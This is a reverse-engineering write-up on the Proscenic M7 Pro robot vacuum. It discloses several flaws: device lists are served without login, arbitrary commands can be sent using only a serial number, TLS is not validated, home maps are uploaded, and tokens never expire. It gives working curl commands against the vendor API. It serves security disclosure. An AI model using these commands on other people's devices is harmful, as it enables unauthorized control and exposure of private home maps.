# Proscenic M7 Pro - reverse engineering

> This is a WIP.

## Firmware
Firmware update was acquired by tcpdumping the robot's traffic.
The URL was `http://47.254.154.181/robotDrivers/1593772189366`.

This is good, so we can exploit the firmware update mechanism to install our own software.
But up to now, I don't know, how the firmware update mechanism works.

You can find the latest firmware (as of 06.12.2020) in `./firmware.bin`.

[binwalk](https://github.com/ReFirmLabs/binwalk) is used for decompressiong the firmware: `binwalk -eM firmware.bin`.

## App
Logging in
```bash
LOGINUSER=iot@example.com
PASSWORD=very-secure
curl -v -k -X POST -H "os: i" -H "Content-Type: application/json" -H "c: 338" -H "lan: en" -H "Host: mobile.proscenic.com.de:443" -H "User-Agent: ProscenicHome/1.7.8 (iPhone; iOS 14.2.1; Scale/3.00)" -H "v: 1.7.8" -d "{\"state\":\"欧洲\",\"countryCode\":\"49\",\"appVer\":\"1.7.8\",\"type\":\"2\",\"os\":\"IOS\",\"password\":\"$(echo -n $PASSWORD | md5sum)\",\"registrationId\":\"13165ffa4eb156ac484\",\"language\":\"EN\",\"username\":\"$LOGINUSER\",\"pwd\":\"$PASSWORD\"}" "https://mobile.proscenic.com.de/user/login"
```
response
```json
{
  "code": 0,
  "msg": "success",
  "data": {
    "token": "<redacted>",
    "uid": "<redacted>",
    "equipcount": 0,
    "nickname": null,
    "recieveMsg": false,
    "countryCode": "49",
    "homeId": null
  }
}
```

Get list of devices:
> **Findind #1**: No login (only username) required
```bash
curl "https://mobile.proscenic.com.de/user/getEquips/$LOGINUSER"  -d "username=$LOGINUSER"
```
response
```json
"content": [
      {
        "name": "M7 Pro",
        "code": "M7_PRO",
        "typeName": "CleanRobot",
        "model": "811_LDS",
        "sn": "<redacted>",
        "deviceId": null,
        "status": true,
        "imgUrl": "http://mobile.proscenic.com.de/images/M7_PRO.png",
        "homeId": null,
        "shared": false,
        "jump": "M7_PRO",
        "ctrlversion": null,
        "enabled": true,
        "scMac": null,
        "scSV": null,
        "faqUrl": "https://www.proscenic.com/support/faq-f0460-l9999.html",
        "cloud": 0,
        "type": "CleanRobot"
      }
]
```

**Finding 2**: The serial number retrieved from above can be used to send arbitrary commands:
```java
    @FormUrlEncoded
    @POST("/instructions/{sn}/{cmdCode}")
    Observable<Result> control(@Field("username") String str, @Path("sn") String str2, @Path("cmdCode") int i, @Field("ctrlCode") String str3);
```
E.g.:
```bash
curl -X POST  -d "charge=start" "https://mobile.proscenic.com.de/instructions/$SN/21012?username=$LOGINUSER"
```

Communication with the robot is primarily relayed through a cloud server.

For you convenience, I've included `./getSockAddr.sh`. Read it and then provide it with `username password`.

## The vacuum robot software
**Finding 3**: The vacuum robot does not perform TLS validation.
Using [sslsplit](https://github.com/droe/sslsplit) we can see, what the robot is talking with its manufacturer.

**Finding 4**: This robot is spying on you: It uploads a map of your home. As can be seen using sslsplit:
```
POST /cleanPack/uploadEvents HTTP/1.1
Host: 47.254.140.182
Accept: */*
Cookie: cookies=<redacted>
Content-Length: 1593
Content-Type: application/x-www-form-urlencoded
Expect: 100-continue

HTTP/1.1 100 Continue

sn=LSLDSM7PRO20510667&ts=348470&data={"infoType":20002,"data":{"SN":"LSLDSM7PRO20510667","mapId":1607215533,"autoAreaId":0,"pathId":1607237159,"width":109,"height":98,"resolution":0.05,"x_min":-4.93,"y_min":-2.83,"lz4_len":935,"area":[],"map":<redacted>
```

**Finding 5**: The app reveals the crypto token plaintext while communicating with the robot through the gateway.
```
{"data":{"token":"<redacted>","sn":"<redacted>"},"infoType":70001}#	#
```
this is sent to the IP and port retrieved by `getSockAddr`.

**Finding 6**: Old tokens (fetched with the script) don't expire. Even if the app only allows for one simultanous login.

**TLDR**: Don't buy this crap.
